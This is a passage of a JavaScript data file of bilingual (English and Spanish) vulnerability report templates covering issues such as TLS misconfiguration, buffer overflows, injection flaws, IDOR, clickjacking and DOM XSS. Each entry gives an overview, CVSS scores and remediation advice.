      overview_en: "### Overview\nThe application's design has fundamental flaws in how it uses cryptography, even if the underlying cryptographic primitives are strong.",
      overview_es: "### Resumen\nEl diseño de la aplicación tiene fallos fundamentales en cómo utiliza la criptografía, incluso si las primitivas criptográficas subyacentes son fuertes.",
      technicalDescription_en: "### Technical Description\nExamples include rolling your own crypto, using encryption without authentication (no MAC), reusing IVs with stream ciphers, or using a static salt for password hashing. These design flaws can render the entire cryptographic protection useless.",
      technicalDescription_es: "### Descripción Técnica\nEjemplos incluyen crear su propia criptografía, usar cifrado sin autenticación (sin MAC), reutilizar IVs con cifrados de flujo, o usar una sal estática para el hash de contraseñas. Estos fallos de diseño pueden hacer que toda la protección criptográfica sea inútil.",
      affectedComponents_en: "### Affected Components\n[TODO: Describe the flawed cryptographic design.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Describir el diseño criptográfico defectuoso.]",
      impact_en: "### Impact\nThis can lead to a complete compromise of the security goals (confidentiality, integrity, authenticity) that the cryptography was meant to provide.",
      impact_es: "### Impacto\nEsto puede llevar a un compromiso completo de los objetivos de seguridad (confidencialidad, integridad, autenticidad) que la criptografía debía proporcionar.",
      recommendations_en: "### Recommendations\nUse well-vetted, standard cryptographic libraries and protocols. Do not attempt to design your own cryptographic schemes. Follow established best practices for using cryptography.",
      recommendations_es: "### Recomendaciones\nUtilizar bibliotecas y protocolos criptográficos estándar y bien examinados. No intentar diseñar sus propios esquemas criptográficos. Seguir las mejores prácticas establecidas para el uso de la criptografía.",
      references: ["https://cwe.mitre.org/data/definitions/310.html"],
      tags: ["Cryptography", "Design Flaw"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-067",
      title_en: "Side-Channel Attacks",
      title_es: "Ataques de Canal Lateral",
      cwe: "CWE-208",
      severity: "Medium",
      cvss: { score: 5.9, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
      overview_en: "### Overview\nThe application leaks information through a side channel, such as timing differences, power consumption, or error messages, which can be used to infer sensitive data.",
      overview_es: "### Resumen\nLa aplicación filtra información a través de un canal lateral, como diferencias de tiempo, consumo de energía o mensajes de error, que se pueden utilizar para inferir datos sensibles.",
      technicalDescription_en: "### Technical Description\nA classic example is a timing attack on string comparison. If comparing a user-supplied password to the correct password, a naive byte-by-byte comparison will exit early if a byte doesn't match. An attacker can measure the time it takes for the comparison to fail to infer the correct password, character by character.",
      technicalDescription_es: "### Descripción Técnica\nUn ejemplo clásico es un ataque de tiempo en la comparación de cadenas. Si se compara una contraseña proporcionada por el usuario con la contraseña correcta, una comparación ingenua byte por byte saldrá temprano si un byte no coincide. Un atacante puede medir el tiempo que tarda la comparación en fallar para inferir la contraseña correcta, carácter por carácter.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the functionality that leaks information via a side channel.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la funcionalidad que filtra información a través de un canal lateral.]",
      impact_en: "### Impact\nSide-channel attacks can lead to the compromise of cryptographic keys, passwords, and other sensitive data.",
      impact_es: "### Impacto\nLos ataques de canal lateral pueden llevar al compromiso de claves criptográficas, contraseñas y otros datos sensibles.",
      recommendations_en: "### Recommendations\nUse constant-time algorithms for all security-sensitive operations, especially cryptographic comparisons. Ensure that error messages are generic and do not leak information.",
      recommendations_es: "### Recomendaciones\nUtilizar algoritmos de tiempo constante para todas las operaciones sensibles a la seguridad, especialmente las comparaciones criptográficas. Asegurarse de que los mensajes de error sean genéricos y no filtren información.",
      references: ["https://portswigger.net/web-security/timing-attacks"],
      tags: ["Cryptography", "Side Channel"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-068",
      title_en: "Certificate Validation Bypass",
      title_es: "Omisión de Validación de Certificados",
      cwe: "CWE-295",
      severity: "High",
      cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
      overview_en: "### Overview\nThe application fails to properly validate the SSL/TLS certificate of the server it is communicating with, allowing an attacker to perform a Man-in-the-Middle (MitM) attack.",
      overview_es: "### Resumen\nLa aplicación no valida correctamente el certificado SSL/TLS del servidor con el que se está comunicando, lo que permite a un atacante realizar un ataque de intermediario (MitM).",
      technicalDescription_en: "### Technical Description\nThe client application is configured to trust any SSL/TLS certificate, or it fails to check the hostname in the certificate. An attacker can present a self-signed or otherwise invalid certificate to intercept and decrypt traffic.",
      technicalDescription_es: "### Descripción Técnica\nLa aplicación cliente está configurada para confiar en cualquier certificado SSL/TLS, o no comprueba el nombre de host en el certificado. Un atacante puede presentar un certificado autofirmado o inválido de otro modo para interceptar y descifrar el tráfico.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the client-side code responsible for TLS connections.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar el código del lado del cliente responsable de las conexiones TLS.]",
      impact_en: "### Impact\nThis completely undermines the protection offered by TLS, allowing an attacker to read and modify all traffic between the client and server.",
      impact_es: "### Impacto\nEsto socava por completo la protección ofrecida por TLS, permitiendo a un atacante leer y modificar todo el tráfico entre el cliente y el servidor.",
      recommendations_en: "### Recommendations\nEnsure that the SSL/TLS certificate validation is enabled and properly configured. Implement certificate pinning for high-security applications.",
      recommendations_es: "### Recomendaciones\nAsegurarse de que la validación de certificados SSL/TLS esté habilitada y configurada correctamente. Implementar el anclaje de certificados para aplicaciones de alta seguridad.",
      references: ["https://cwe.mitre.org/data/definitions/295.html"],
      tags: ["Cryptography", "MitM"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-069",
      title_en: "Insecure SSL/TLS Configuration",
      title_es: "Configuración Insegura de SSL/TLS",
      cwe: "CWE-326",
      severity: "Medium",
      cvss: { score: 5.9, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
      overview_en: "### Overview\nThe server is configured to use weak SSL/TLS protocols or cipher suites.",
      overview_es: "### Resumen\nEl servidor está configurado para usar protocolos o conjuntos de cifrado SSL/TLS débiles.",
      technicalDescription_en: "### Technical Description\nThe server supports outdated protocols like SSLv3 or TLS 1.0, or weak cipher suites (e.g., those using RC4 or having short key lengths). These are vulnerable to known attacks like POODLE or BEAST.",
      technicalDescription_es: "### Descripción Técnica\nEl servidor admite protocolos obsoletos como SSLv3 o TLS 1.0, o conjuntos de cifrado débiles (p. ej., los que usan RC4 o tienen longitudes de clave cortas). Estos son vulnerables a ataques conocidos como POODLE o BEAST.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the server and port with the insecure TLS configuration.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar el servidor y el puerto con la configuración TLS insegura.]",
      impact_en: "### Impact\nAn attacker may be able to decrypt or tamper with traffic between the client and the server.",
      impact_es: "### Impacto\nUn atacante podría ser capaz de descifrar o manipular el tráfico entre el cliente y el servidor.",
      recommendations_en: "### Recommendations\nDisable support for all legacy SSL/TLS protocols. Configure the server to only use strong, modern cipher suites and protocols (TLS 1.2 and TLS 1.3).",
      recommendations_es: "### Recomendaciones\nDeshabilitar el soporte para todos los protocolos SSL/TLS heredados. Configurar el servidor para que solo use conjuntos de cifrado y protocolos fuertes y modernos (TLS 1.2 y TLS 1.3).",
      references: ["https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Security_Cheat_Sheet.html"],
      tags: ["Cryptography", "TLS"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-070",
      title_en: "Buffer Overflow",
      title_es: "Desbordamiento de Búfer",
      cwe: "CWE-120",
      severity: "High",
      cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
      overview_en: "### Overview\nA buffer overflow is a type of software vulnerability that exists when an area of memory within a software application reaches its address boundary and writes into an adjacent memory region.",
      overview_es: "### Resumen\nUn desbordamiento de búfer es un tipo de vulnerabilidad de software que existe cuando un área de memoria dentro de una aplicación de software alcanza su límite de dirección y escribe en una región de memoria adyacente.",
      technicalDescription_en: "### Technical Description\nThis typically occurs when the application does not properly validate the length of user-supplied input before copying it to a fixed-size buffer. An attacker can provide an overly long input to overwrite adjacent memory, which may contain control data, leading to arbitrary code execution.",
      technicalDescription_es: "### Descripción Técnica\nEsto ocurre típicamente cuando la aplicación no valida correctamente la longitud de la entrada proporcionada por el usuario antes de copiarla a un búfer de tamaño fijo. Un atacante puede proporcionar una entrada demasiado larga para sobrescribir la memoria adyacente, que puede contener datos de control, lo que lleva a la ejecución de código arbitrario.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the vulnerable function and parameter.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la función y el parámetro vulnerables.]",
      impact_en: "### Impact\nThis can lead to denial of service or remote code execution, giving an attacker full control of the application.",
      impact_es: "### Impacto\nEsto puede conducir a una denegación de servicio o a la ejecución remota de código, dando a un atacante el control total de la aplicación.",
      recommendations_en: "### Recommendations\nUse memory-safe languages or libraries. Perform bounds checking on all inputs. Use compiler-level protections like Stack Canaries, ASLR, and DEP.",
      recommendations_es: "### Recomendaciones\nUsar lenguajes o bibliotecas seguros para la memoria. Realizar comprobaciones de límites en todas las entradas. Usar protecciones a nivel de compilador como Stack Canaries, ASLR y DEP.",
      references: ["https://cwe.mitre.org/data/definitions/120.html"],
      tags: ["Additional", "Memory Corruption"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-071",
      title_en: "Format String Vulnerabilities",
      title_es: "Vulnerabilidades de Cadena de Formato",
      cwe: "CWE-134",
      severity: "High",
      cvss: { score: 7.8, vectorString: "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "L", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
      overview_en: "### Overview\nFormat string vulnerabilities occur when user-controlled data is passed as the format string argument to functions like `printf`.",
      overview_es: "### Resumen\nLas vulnerabilidades de cadena de formato ocurren cuando los datos controlados por el usuario se pasan como el argumento de cadena de formato a funciones como `printf`.",
      technicalDescription_en: "### Technical Description\nAn attacker can use format string specifiers (e.g., `%x`, `%s`, `%n`) to read from the stack, write to arbitrary memory locations, and execute arbitrary code.",
      technicalDescription_es: "### Descripción Técnica\nUn atacante puede usar especificadores de cadena de formato (p. ej., `%x`, `%s`, `%n`) para leer de la pila, escribir en ubicaciones de memoria arbitrarias y ejecutar código arbitrario.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the function (e.g., `printf`, `sprintf`) and the code path where user input is used as the format string.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la función (p. ej., `printf`, `sprintf`) y la ruta del código donde la entrada del usuario se usa como la cadena de formato.]",
      impact_en: "### Impact\nThis can lead to information disclosure, denial of service, and arbitrary code execution.",
      impact_es: "### Impacto\nEsto puede llevar a la divulgación de información, denegación de servicio y ejecución de código arbitrario.",
      recommendations_en: "### Recommendations\nAlways specify a static format string for functions like `printf`. For example, use `printf(\"%s\", userInput)` instead of `printf(userInput)`.",
      recommendations_es: "### Recomendaciones\nSiempre especificar una cadena de formato estática para funciones como `printf`. Por ejemplo, usar `printf(\"%s\", userInput)` en lugar de `printf(userInput)`.",
      references: ["https://cwe.mitre.org/data/definitions/134.html"],
      tags: ["Additional", "Memory Corruption"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-072",
      title_en: "Race Conditions",
      title_es: "Condiciones de Carrera",
      cwe: "CWE-362",
      severity: "Medium",
      cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:L", attackVector: "N", attackComplexity: "H", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "N", integrity: "H", availability: "L" },
      overview_en: "### Overview\nAn attacker can exploit a flaw in the application's handling of concurrent operations to cause unintended behavior, such as bypassing security checks or corrupting data.",
      overview_es: "### Resumen\nUn atacante puede explotar un fallo en el manejo de operaciones concurrentes de la aplicación para causar un comportamiento no deseado, como eludir controles de seguridad o corromper datos.",
      technicalDescription_en: "### Technical Description\nThe application performs a sequence of operations that are not atomic (e.g., checking a user's balance and then making a withdrawal). An attacker can send multiple requests simultaneously, causing the operations to interleave in an unexpected way. For example, they could submit two withdrawal requests at the same time, and the application might check the balance for both requests before either withdrawal is processed, allowing the user to withdraw more money than they have.",
      technicalDescription_es: "### Descripción Técnica\nLa aplicación realiza una secuencia de operaciones que no son atómicas (p. ej., verificar el saldo de un usuario y luego realizar un retiro). Un atacante puede enviar múltiples solicitudes simultáneamente, haciendo que las operaciones se intercalen de una manera inesperada. Por ejemplo, podrían enviar dos solicitudes de retiro al mismo tiempo, y la aplicación podría verificar el saldo para ambas solicitudes antes de que se procese cualquiera de los retiros, permitiendo al usuario retirar más dinero del que tiene.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the functionality that is vulnerable to a race condition, e.g., transferring funds or using a one-time coupon.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la funcionalidad que es vulnerable a una condición de carrera, p. ej., transferir fondos o usar un cupón de un solo uso.]",
      impact_en: "### Impact\nRace conditions can lead to data corruption, financial loss, and bypass of security logic. The impact is highly dependent on the specific context.",
      impact_es: "### Impacto\nLas condiciones de carrera pueden conducir a la corrupción de datos, pérdidas financieras y la elusión de la lógica de seguridad. El impacto depende en gran medida del contexto específico.",
      recommendations_en: "### Recommendations\nEnsure that sequences of operations that must be atomic are protected by proper locking mechanisms (e.g., database transactions, mutexes, semaphores).",
      recommendations_es: "### Recomendaciones\nAsegurarse de que las secuencias de operaciones que deben ser atómicas estén protegidas por mecanismos de bloqueo adecuados (p. ej., transacciones de base de datos, mutex, semáforos).",
      references: ["https://portswigger.net/web-security/race-conditions"],
      tags: ["Additional", "Business Logic"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-073",
      title_en: "LDAP Injection",
      title_es: "Inyección LDAP",
      cwe: "CWE-90",
      severity: "High",
      cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
      overview_en: "### Overview\nLDAP injection is an attack technique used to exploit web applications that construct LDAP statements from user-supplied input.",
      overview_es: "### Resumen\nLa inyección LDAP es una técnica de ataque utilizada para explotar aplicaciones web que construyen sentencias LDAP a partir de la entrada proporcionada por el usuario.",
      technicalDescription_en: "### Technical Description\nWhen an application fails to properly sanitize user input before adding it to an LDAP query, an attacker can inject LDAP metacharacters to modify the query. This can be used to bypass authentication, elevate privileges, or disclose sensitive information.",
      technicalDescription_es: "### Descripción Técnica\nCuando una aplicación no desinfecta correctamente la entrada del usuario antes de agregarla a una consulta LDAP, un atacante puede inyectar metacaracteres LDAP para modificar la consulta. Esto se puede usar para eludir la autenticación, elevar privilegios o divulgar información sensible.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the functionality that constructs LDAP queries from user input.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la funcionalidad que construye consultas LDAP a partir de la entrada del usuario.]",
      impact_en: "### Impact\nThis can lead to authentication bypass, privilege escalation, and information disclosure.",
      impact_es: "### Impacto\nEsto puede llevar a la omisión de la autenticación, la escalada de privilegios y la divulgación de información.",
      recommendations_en: "### Recommendations\nSanitize all user-supplied input before including it in LDAP queries. Use a framework-provided LDAP encoding function.",
      recommendations_es: "### Recomendaciones\nDesinfectar todas las entradas proporcionadas por el usuario antes de incluirlas en las consultas LDAP. Usar una función de codificación LDAP proporcionada por el marco de trabajo.",
      references: ["https://owasp.org/www-community/attacks/LDAP_Injection"],
      tags: ["Additional", "Injection"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-074",
      title_en: "XPath Injection",
      title_es: "Inyección XPath",
      cwe: "CWE-643",
      severity: "High",
      cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
      overview_en: "### Overview\nXPath injection is an attack technique used to exploit applications that construct XPath queries from user-supplied input.",
      overview_es: "### Resumen\nLa inyección XPath es una técnica de ataque utilizada para explotar aplicaciones que construyen consultas XPath a partir de la entrada proporcionada por el usuario.",
      technicalDescription_en: "### Technical Description\nSimilar to SQL injection, an attacker can inject malicious characters into an XPath query to alter its structure and retrieve sensitive data from the XML document.",
      technicalDescription_es: "### Descripción Técnica\nSimilar a la inyección SQL, un atacante puede inyectar caracteres maliciosos en una consulta XPath para alterar su estructura y recuperar datos sensibles del documento XML.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the functionality that constructs XPath queries from user input.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la funcionalidad que construye consultas XPath a partir de la entrada del usuario.]",
      impact_en: "### Impact\nThis can lead to the disclosure of sensitive information from the XML data source.",
      impact_es: "### Impacto\nEsto puede llevar a la divulgación de información sensible de la fuente de datos XML.",
      recommendations_en: "### Recommendations\nUse parameterized XPath queries. Sanitize user input before including it in an XPath query.",
      recommendations_es: "### Recomendaciones\nUtilizar consultas XPath parametrizadas. Desinfectar la entrada del usuario antes de incluirla en una consulta XPath.",
      references: ["https://owasp.org/www-community/attacks/XPATH_Injection"],
      tags: ["Additional", "Injection"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-075",
      title_en: "Server-Side Template Injection",
      title_es: "Inyección de Plantillas del Servidor",
      cwe: "CWE-94",
      severity: "High",
      cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
      overview_en: "### Overview\nServer-side template injection vulnerabilities arise when user input is concatenated into a template, rather than being passed as data. This can allow an attacker to inject template directives and execute arbitrary code.",
      overview_es: "### Resumen\nLasulnerabilidades de inyección de plantillas del lado del servidor surgen cuando la entrada del usuario se concatena en una plantilla, en lugar de pasarse como datos. Esto puede permitir que un atacante inyecte directivas de plantilla y ejecute código arbitrario.",
      technicalDescription_en: "### Technical Description\nAn attacker can provide a payload that looks like a template expression, such as `{{7*7}}`. If the application evaluates this and returns `49`, it is vulnerable. The attacker can then use more complex payloads to read files, execute commands, and compromise the server.",
      technicalDescription_es: "### Descripción Técnica\nUn atacante puede proporcionar una carga útil que parece una expresión de plantilla, como `{{7*7}}`. Si la aplicación evalúa esto y devuelve `49`, es vulnerable. El atacante puede luego usar cargas útiles más complejas para leer archivos, ejecutar comandos y comprometer el servidor.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the functionality that renders templates with user input.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la funcionalidad que renderiza plantillas con la entrada del usuario.]",
      impact_en: "### Impact\nThis can lead to remote code execution and full server compromise.",
      impact_es: "### Impacto\nEsto puede conducir a la ejecución remota de código y al compromiso total del servidor.",
      recommendations_en: "### Recommendations\nAlways pass user input as data to the template engine. Do not concatenate user input into the template itself. Use a sandboxed template engine if possible.",
      recommendations_es: "### Recomendaciones\nSiempre pasar la entrada del usuario como datos al motor de plantillas. No concatenar la entrada del usuario en la propia plantilla. Usar un motor de plantillas en un entorno aislado (sandbox) si es posible.",
      references: ["https://portswigger.net/web-security/server-side-template-injection"],
      tags: ["Additional", "Injection"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-076",
      title_en: "Open-Source Vulnerabilities",
      title_es: "Vulnerabilidades en Código Abierto",
      cwe: "CWE-1104",
      severity: "Critical",
      cvss: { score: 9.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
      overview_en: "### Overview\nThe application uses open-source libraries or components with known vulnerabilities.",
      overview_es: "### Resumen\nLa aplicación utiliza bibliotecas o componentes de código abierto con vulnerabilidades conocidas.",
      technicalDescription_en: "### Technical Description\nA dependency used by the application has a publicly disclosed vulnerability (a CVE). An attacker can exploit this vulnerability to compromise the application.",
      technicalDescription_es: "### Descripción Técnica\nUna dependencia utilizada por la aplicación tiene una vulnerabilidad divulgada públicamente (un CVE). Un atacante puede explotar esta vulnerabilidad para comprometer la aplicación.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the vulnerable library, its version, and the relevant CVE.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la biblioteca vulnerable, su versión y el CVE relevante.]",
      impact_en: "### Impact\nThe impact depends on the specific vulnerability but can range from information disclosure to remote code execution.",
      impact_es: "### Impacto\nEl impacto depende de la vulnerabilidad específica, pero puede variar desde la divulgación de información hasta la ejecución remota de código.",
      recommendations_en: "### Recommendations\nUse a software composition analysis (SCA) tool to regularly scan for vulnerable dependencies. Update all libraries to the latest secure version. Implement a patch management process for third-party components.",
      recommendations_es: "### Recomendaciones\nUtilizar una herramienta de análisis de composición de software (SCA) para escanear regularmente en busca de dependencias vulnerables. Actualizar todas las bibliotecas a la última versión segura. Implementar un proceso de gestión de parches para componentes de terceros.",
      references: ["https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities"],
      tags: ["Additional", "Dependency"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-077",
      title_en: "Insecure Direct Object References (IDOR)",
      title_es: "Referencias Directas a Objetos Inseguras (IDOR)",
      cwe: "CWE-639",
      severity: "High",
      cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
      overview_en: "### Overview\nIDOR occurs when an application provides direct access to objects based on user-supplied input. As a result of this vulnerability, attackers can bypass authorization and access resources in the system directly.",
      overview_es: "### Resumen\nIDOR ocurre cuando una aplicación proporciona acceso directo a objetos basándose en la entrada proporcionada por el usuario. Como resultado de esta vulnerabilidad, los atacantes pueden eludir la autorización y acceder a los recursos del sistema directamente.",
      technicalDescription_en: "### Technical Description\nAn application uses a user-supplied ID to access a resource (e.g., `.../invoice.php?id=123`). The application fails to verify that the logged-in user is authorized to access invoice #123. An attacker can change the `id` parameter to access other users' invoices.",
      technicalDescription_es: "### Descripción Técnica\nUna aplicación utiliza un ID proporcionado por el usuario para acceder a un recurso (p. ej., `.../invoice.php?id=123`). La aplicación no verifica que el usuario que ha iniciado sesión esté autorizado para acceder a la factura #123. Un atacante puede cambiar el parámetro `id` para acceder a las facturas de otros usuarios.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the vulnerable URL and parameter.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la URL y el parámetro vulnerables.]",
      impact_en: "### Impact\nThis can lead to unauthorized access to sensitive data, modification of data, and other privilege escalation issues.",
      impact_es: "### Impacto\nEsto puede llevar a un acceso no autorizado a datos sensibles, modificación de datos y otros problemas de escalada de privilegios.",
      recommendations_en: "### Recommendations\nImplement access control checks on the server-side for every request to a private object. Use per-user or per-session indirect object references (e.g., mapping an integer from 1 to n to the actual object ID).",
      recommendations_es: "### Recomendaciones\nImplementar comprobaciones de control de acceso en el lado del servidor para cada solicitud a un objeto privado. Usar referencias indirectas a objetos por usuario o por sesión (p. ej., mapeando un entero de 1 a n al ID del objeto real).",
      references: ["https://owasp.org/www-project-top-ten/2013/a4-insecure-direct-object-references"],
      tags: ["Additional", "Access Control"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-078",
      title_en: "Missing Security Headers",
      title_es: "Cabeceras de Seguridad Faltantes",
      cwe: "CWE-693",
      severity: "Medium",
      cvss: { score: 5.3, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "N", availability: "N" },
      overview_en: "### Overview\nThe application is missing important HTTP security headers, leaving it more vulnerable to certain types of attacks like XSS, clickjacking, and information disclosure.",
      overview_es: "### Resumen\nLa aplicación carece de importantes cabeceras de seguridad HTTP, lo que la deja más vulnerable a ciertos tipos de ataques como XSS, clickjacking y divulgación de información.",
      technicalDescription_en: "### Technical Description\nThe application's HTTP responses do not include headers such as `Content-Security-Policy`, `Strict-Transport-Security`, `X-Content-Type-Options`, `X-Frame-Options`, or `Referrer-Policy`.",
      technicalDescription_es: "### Descripción Técnica\nLas respuestas HTTP de la aplicación no incluyen cabeceras como `Content-Security-Policy`, `Strict-Transport-Security`, `X-Content-Type-Options`, `X-Frame-Options` o `Referrer-Policy`.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the server or application and list the missing headers.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar el servidor o la aplicación y listar las cabeceras faltantes.]",
      impact_en: "### Impact\nThe absence of these headers reduces the effectiveness of browser-based security mechanisms, making attacks like XSS and clickjacking easier to execute.",
      impact_es: "### Impacto\nLa ausencia de estas cabeceras reduce la eficacia de los mecanismos de seguridad basados en el navegador, lo que facilita la ejecución de ataques como XSS y clickjacking.",
      recommendations_en: "### Recommendations\nImplement all relevant HTTP security headers with appropriate policies. Use a tool like Security Headers by Mozilla to check the configuration.",
      recommendations_es: "### Recomendaciones\nImplementar todas las cabeceras de seguridad HTTP relevantes con las políticas adecuadas. Usar una herramienta como Security Headers de Mozilla para verificar la configuración.",
      references: ["https://owasp.org/www-project-secure-headers/"],
      tags: ["Additional", "Configuration"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-079",
      title_en: "Clickjacking",
      title_es: "Secuestro de Clics",
      cwe: "CWE-1021",
      severity: "Medium",
      cvss: { score: 5.4, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "L", integrity: "L", availability: "N" },
      overview_en: "### Overview\nClickjacking is an attack that tricks a user into clicking on something different from what the user perceives, thus potentially revealing confidential information or taking control of their computer while clicking on seemingly innocuous web pages.",
      overview_es: "### Resumen\nEl secuestro de clics es un ataque que engaña a un usuario para que haga clic en algo diferente de lo que el usuario percibe, revelando así potencialmente información confidencial o tomando el control de su computadora mientras hace clic en páginas web aparentemente inofensivas.",
      technicalDescription_en: "### Technical Description\nAn attacker creates a malicious page and embeds the vulnerable application in a transparent iframe. The attacker then overlays their own UI elements to trick the user into clicking on buttons or links within the hidden iframe, performing actions on behalf of the user.",
      technicalDescription_es: "### Descripción Técnica\nUn atacante crea una página maliciosa e incrusta la aplicación vulnerable en un iframe transparente. El atacante luego superpone sus propios elementos de interfaz de usuario para engañar al usuario para que haga clic en botones o enlaces dentro del iframe oculto, realizando acciones en nombre del usuario.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the application pages that can be framed.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar las páginas de la aplicación que pueden ser enmarcadas.]",
      impact_en: "### Impact\nAn attacker can trick a user into performing unintended actions, such as making a purchase, deleting data, or changing permissions.",
      impact_es: "### Impacto\nUn atacante puede engañar a un usuario para que realice acciones no deseadas, como realizar una compra, eliminar datos o cambiar permisos.",
      recommendations_en: "### Recommendations\nImplement the `X-Frame-Options` header (with `DENY` or `SAMEORIGIN`) and a `Content-Security-Policy` with a `frame-ancestors` directive to prevent the application from being framed.",
      recommendations_es: "### Recomendaciones\nImplementar la cabecera `X-Frame-Options` (con `DENY` o `SAMEORIGIN`) y una `Content-Security-Policy` con una directiva `frame-ancestors` para evitar que la aplicación sea enmarcada.",
      references: ["https://owasp.org/www-community/attacks/Clickjacking"],
      tags: ["Additional", "Clickjacking"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-080",
      title_en: "DOM-based XSS",
      title_es: "XSS basado en DOM",
      cwe: "CWE-79",
      severity: "Medium",
      cvss: { score: 6.1, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "C", confidentiality: "L", integrity: "L", availability: "N" },
      overview_en: "### Overview\nDOM-based XSS is an XSS attack wherein the attack payload is executed as a result of modifying the DOM 'environment' in the victim's browser used by the original client-side script, so that the client-side code runs in an 'unexpected' manner.",
      overview_es: "### Resumen\nEl XSS basado en DOM es un ataque XSS en el que la carga útil del ataque se ejecuta como resultado de la modificación del 'entorno' DOM en el navegador de la víctima utilizado por el script original del lado del cliente, de modo que el código del lado del cliente se ejecuta de una manera 'inesperada'.",
      technicalDescription_en: "### Technical Description\nThe client-side script reads data from a user-controlled source (e.g., `location.hash`) and passes it to a dangerous sink (e.g., `innerHTML`) without proper sanitization. An attacker can craft a URL that includes a malicious payload in the fragment, which is then executed by the script.",
